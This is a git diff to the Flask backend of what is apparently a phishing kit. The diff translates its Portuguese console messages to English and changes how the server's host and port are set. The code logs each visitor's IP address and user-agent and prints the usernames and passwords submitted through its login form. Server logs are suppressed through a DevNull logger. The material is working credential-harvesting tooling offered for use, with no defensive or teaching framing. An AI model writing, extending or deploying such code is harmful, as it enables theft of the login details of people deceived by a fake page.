@@ -2,8 +2,6 @@ from flask import Flask, render_template, request
 from src.file import Files
 from gevent.pywsgi import WSGIServer
 from src.hide_logs import DevNull
-from os import getenv
-from dotenv import load_dotenv
 
 
 app = Flask(__name__)
@@ -17,7 +15,7 @@ def main():
     if request.method == "GET":
         if request.environ['REMOTE_ADDR']:
             print()
-            print('USUÁRIO CLICOU!')
+            print('SOMEONE CAME IN!')
             print(request.environ['REMOTE_ADDR'])
             print(request.headers.get('User-agent'))
             print()
@@ -30,11 +28,11 @@ def main():
             password = 'EMPTY-PASSWORD'
 
         if len(request.form.get("username").replace(' ', '')) and len(request.form.get("password").replace(' ', '')):
-            print(f'DADOS DE {request.environ["REMOTE_ADDR"]}')
-            print(f'USUÁRIO: {user}')
-            print(f'SENHA: {password}')
+            print(f'DATA FROM {request.environ["REMOTE_ADDR"]}')
+            print(f'USERNAME: {user}')
+            print(f'PASSWORD: {password}')
         else:
-            print('USUÁRIO INSERIU CAMPO(S) VAZIO(S)')
+            print('USER ENTERED EMPTY DATA')
 
         print()
 
@@ -43,8 +41,13 @@ def main():
 
 
 if __name__ == '__main__':
-    load_dotenv()
+    HOST = '127.0.0.1'
+    port = int(input('PORT: '))
 
-    # app.run(port=getenv('PORT'), host=getenv('HOST'), debug=False)
-    server = WSGIServer((getenv('HOST'), getenv('PORT')), app, log=DevNull)
+    print()
+    print('RUNNING...')
+    print(f'http://{HOST}:{port}')
+    print(f'https://{HOST}:{port}')
+
+    server = WSGIServer((HOST, port), app, log=DevNull)
     server.serve_forever()
